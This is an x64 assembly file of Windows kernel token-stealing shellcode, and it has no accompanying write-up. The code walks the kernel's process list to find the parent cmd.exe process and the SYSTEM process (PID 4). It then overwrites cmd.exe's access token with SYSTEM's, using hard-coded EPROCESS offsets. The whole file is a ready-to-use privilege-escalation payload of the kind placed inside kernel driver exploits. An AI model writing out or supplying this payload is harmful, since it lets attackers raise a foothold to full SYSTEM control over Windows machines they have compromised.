section .text
BITS 64

		nop

		mov r9, qword [gs:0x188]			    ; get _KTHREAD
		mov r9, qword [r9 + 0x220]				; get _EPROCESS/_KPROCESS
		mov r8, qword [r9 + 0x540]				; get the InheritedFromUniqueProcessId (cmd.exe PID)

		loop1:
			mov r9, qword [r9+0x448]			; go to the flink
			sub r9, 0x448						; back to the start of _EPROCESS
			mov r10, qword [r9+0x440]			; get the UniqueProcessId
			cmp r10, r8							; compare both PIDs
			jne loop1
			
		mov rax, r9								; get the cmd.exe's token
		add rax, 0x4b8							; get the address of _EPROCESS on Token position

		loop2:
			mov r9, qword [r9+0x448]			; go to the flink
			sub r9, 0x448						; go to the _EPROCESS' structure start
			mov r10, qword [r9+0x440]			; Get the UniqueProcesId
			cmp r10, 4							; compare the process ID with 4
			jne loop2
			
		mov r9, qword [r9+0x4b8]
		mov [rax], r9

		ret

end